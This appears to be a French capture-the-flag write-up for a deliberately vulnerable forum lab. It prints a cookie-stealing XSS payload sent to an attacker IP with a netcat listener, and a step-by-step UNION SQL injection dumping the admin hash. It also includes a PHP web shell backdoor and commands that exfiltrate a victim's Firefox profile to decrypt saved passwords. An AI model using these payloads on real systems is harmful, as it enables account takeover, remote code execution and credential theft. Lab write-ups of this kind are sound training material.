# Challenge RSR

## Se connecter en tant que modérateur

La première étape va être de se connecter en tant que modérateur, en exploitant une faille XSS. 

On va tout d'abord créer un compte utilisateur sur la page d'incription. Une fois inscrit et connecté, nous avons accès au forum et nous pouvons ajouter de nouveaux messages. Il est alors possible d'exécuter du javascript dans les commentaires des topics.

```html
<script>alert(document.cookie)</script>
```

On peut alors récupérer le cookie de session d'une personne venant lire notre message.

```html
<!-- Remplacer l'adresse IP par la votre -->
<img src="azerty.jpg" onerror="this.src=`http://172.21.31.1/cookie?=`+document.cookie;">
```

On signal ensuite notre message pour qu'il se fasse controllé par un modérateur.

```bash
netcat -l -p 80 -v
```

On ouvre le port 80 de notre machine, et on attend une réponse...

## Trouver le mot de passe crypté de l'administrateur

Une fois connecté en tant que modérateur, un nouveau champ est disponible dans l'onglet `profil`. Ce champ permet de signaler des utilisateurs. Comme les modérateurs ne sont pas considérés comme des attaquants potentiels, ce champ n'a pas été sécurisé contre les injections SQL. Vous allez pouvoir l'utiliser pour trouver le mot de passe (crypté) de l'administrateur.

Tout d'abord il faut déterminer combien de champs sont nécessaires pour la requête. On peut utilisé le nom d'un utilisateur que nous avons créé, et incrémenter `ORDER BY` jusqu'à avoir une erreur.

```SQL
user 'ORDER BY 1;#
user 'ORDER BY 2;#
```

On constate qu'un seul champ est nécessaire. On peut maintenant chercher le nom de la base de données. Ici on utilise un nom d'utilisateur invalide pour exécuter `UNION`.

```SQL
z' UNION SELECT database();#
>>RSRWebsite
```

Puis le nom des tables...

```SQL
z' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'RSRWebsite' LIMIT 0,1;#
>>posts
z' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'RSRWebsite' LIMIT 1,2;#
>>topics
z' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'RSRWebsite' LIMIT 2,3;#
>>users
z' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'RSRWebsite' LIMIT 3,4;#
>>error!
```

Il y a 3 tables. La table `users` semble sortir du lot. On regarde alors le nom des colonnes.

```SQL
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 0,1;#
>>id_user
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 1,2;#
>>username
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 2,3;#
>>password
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 3,4;#
>>rank
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 4,5;#
>>reported
z' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'RSRWebsite' AND TABLE_NAME = 'users' LIMIT 4,5;#
>>error!
```

Nous n'avons pas accès à la liste des utilisateurs, et donc à l'identifiant de l'administrateur. On voit cependant une colonne `rank`, qui définit le rang des utilisateurs. On regarde le rang de notre utilisateur.

```SQL
z' UNION SELECT rank FROM users WHERE username = 'user';#
```
La réponse retournée est alors un chiffre. On essaie alors de changé le chiffre pour trouver l'administrateur.

```SQL
z' UNION SELECT username FROM users WHERE rank = 3;#
>>admin
```

On se concenter alors sur le colonne `password`.

```SQL
z' UNION SELECT password FROM users WHERE username = 'admin';#
```

On obtient alors le mot de passe crypté de l'administrateur !

## Se connecter en tant qu'administrateur

Sur la page de connexion, en regardant le code source de la page, on remarque qu'une fonction `createCookie()` est appellée lorsqu'on clique sur le bouton pour se connecter. Le cookie est passé en POST à l'aide d'un champ masqué. On ne trouve pas cette fonction dans la page. Cependant, une balise script est présente sur la page, mais le code est obfusqué. On peut alors déchiffrer ce code voir de quoi il s'agit (`https://beautifier.io/`).

Une fois le code dechiffré, on voit alors la fonction `createCookie()`. Le cookie est le sha1 de la concaténation du nom d'utilisateur avec le sha1 du mot de passe. Il faut alors recréer le cookie de l'administrateur avec son pseudo et sont mot de passe chiffré trouvé précédemment. 

## File inclusion

Sur le profil de l'administrateur, un nouveau champ est disponible. Ce champ permet d'upload les fichiers visibles dans l'onglet `Documents`. L'extension des fichiers uploadés n'est pas vérifiée. Nous allons alors pouvoir écrire une backdoor php dans un fichierphp, puis la téléverser.

```PHP
//https://gist.github.com/sente/4dbb2b7bdda2647ba80b
//Simple PHP Backdoor By DK (One-Liner Version) 
//Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd 
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

On peut alors exécuter des commandes bash dans l'url :

```
http://localhost/RSR/upload/backdoor.php?cmd=ls
http://localhost/RSR/upload/backdoor.php?cmd=ls+../
```

En parcourant les dossiers de l'administrateur, on peut alors trouver un fichier `remember_password.txt` dans ses documents.

```bash
http://localhost/RSR/upload/backdoor.php?cmd=ls+../../../../../home/elfen/Documents
http://localhost/RSR/upload/backdoor.php?cmd=cat+../../../../../home/elfen/Documents:remember_password.txt
```

## Trouver le mot de passe facebook de l'admin

On voit dans ce précédent fichier qu'il y a le master password de firefox. On va donc récupérer les fichiers de firefox pour dump les mots de passe enregistrés. On commence par ouvrir un serveur python pour récupérer les fichiers.

```bash
http://localhost/RSR/upload/backdoor.php?cmd=cd+../../../../../home/elfen/;python+-m+SimpleHTTPServer+8080
```

On télécharge le dossier `.mozilla`

```bash
wget -r -p IP_VM:8080/.mozilla/
```

On dump les mots de passe avec firefix_

```bash
python3 firefox_decrypt.py path/to/.mozilla/firefox/random.default/
```